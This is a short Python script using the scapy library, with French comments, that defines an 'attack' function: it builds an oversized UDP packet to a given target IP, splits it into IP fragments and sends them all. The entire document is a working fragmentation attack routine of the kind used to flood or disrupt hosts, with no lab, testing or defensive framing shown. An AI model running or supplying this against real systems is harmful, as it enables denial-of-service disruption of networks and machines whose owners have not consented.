from scapy.all import IP,UDP,send,fragment

def attack(target_ip, size=1500):
    """Attaque par fragmentation"""
    # Création d'un grand paquet
    packet = IP(dst=target_ip)/UDP()/("X" * size)
    # Fragment le paquet
    frags = fragment(packet)
    # Envoi des fragments
    for frag in frags:
        send(frag, verbose=False)